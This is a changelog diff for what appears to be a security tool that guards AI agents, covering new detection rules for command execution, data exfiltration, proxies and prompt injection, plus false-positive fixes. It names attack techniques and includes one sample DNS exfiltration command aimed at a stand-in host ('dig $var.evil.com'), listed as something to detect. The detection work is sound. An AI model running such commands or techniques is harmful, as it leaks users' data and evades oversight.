@@ -18,9 +18,14 @@ All notable changes to this project will be documented in this file.
 - **ExecGuard**: `awk` `system()`/`popen()` command execution detection (critical).
 - **ExecGuard**: GNU `sed` `/e` flag command execution detection (high).
 - **DataExfil**: SSH reverse tunnel (`ssh -R`) exfiltration detection (high).
+- **DataExfil**: DNS exfiltration via bare variable reference (`dig $var.evil.com`) detection (high).
 - **NetworkGuard**: SOCKS proxy (`--socks4/5`, `socks5://`) connection detection (high).
+- **Adapter-MCP**: stdio mode now scans tool responses for data exfiltration via request/response correlation.
 
 ### Fixed
+- **ExecGuard**: `bun run dev`/`bun run build`/`bun run test` no longer trigger false positives — patterns now only flag remote URLs and `/tmp/` paths.
+- **ExecGuard**: `deno run mod.ts` (local files) no longer triggers false positives.
+- **Adapter-langchain**: `checkResponse` sessionId now parameterized instead of hardcoded `"bridge-session"`.
 - **GitHub Action**: Fixed command injection vulnerability in `action.yml` inputs — moved shell-interpolated inputs to `env:` block.
 - **CLI**: All `process.exit(1)` calls replaced with `process.exitCode = 1` to prevent resource leaks (13 instances across 7 files).
 - **PromptInjection**: Russian patterns now handle Cyrillic-Latin homoglyph normalization correctly.
@@ -34,13 +39,17 @@ All notable changes to this project will be documented in this file.
 - **DataExfil**: `ssh -R` severity reduced from critical to high to avoid false positives on legitimate reverse tunneling.
 
 ### Changed
-- ExecGuard pattern count: 147 → 152 (+5: git config hooks, alias/function evasion).
-- NetworkGuard pattern count: 42 → 43 (+1: URL shortener detection).
+- ExecGuard pattern count: 147 → 155 (+8: git config hooks, alias/function evasion, bun/deno refinement).
+- DataExfil pattern count: 65 → 67 (+2: bare variable DNS exfil, ping DNS tunnel).
+- NetworkGuard pattern count: 42 → 45 (+3: URL shortener detection, SOCKS proxy, ipv4only.arpa).
+- PromptInjection pattern count: 43 → 44 (+1: translate verb).
+- PathGuard pattern count: 73 → 75 (+2).
 - Adapter-langchain now scans tool responses for data exfiltration (`checkResponse` + `/check/response` endpoint).
+- Adapter-MCP stdio mode now buffers and scans child stdout responses for data exfiltration.
 - Adapter-MCP and adapter-openclaw now scan structured MCP responses (`content[].text`), not just plain strings.
 - Consolidated `INVISIBLE_CHARS_RE` from 6 rule files into shared `utils/normalize.ts`.
 - Consolidated `extractStringContent` from adapter-mcp and adapter-openclaw into `@carapace/core`.
-- 2038 tests (+27 new).
+- 2051 tests (+40 new).
 
 ## [0.12.0] - 2026-05-17
 
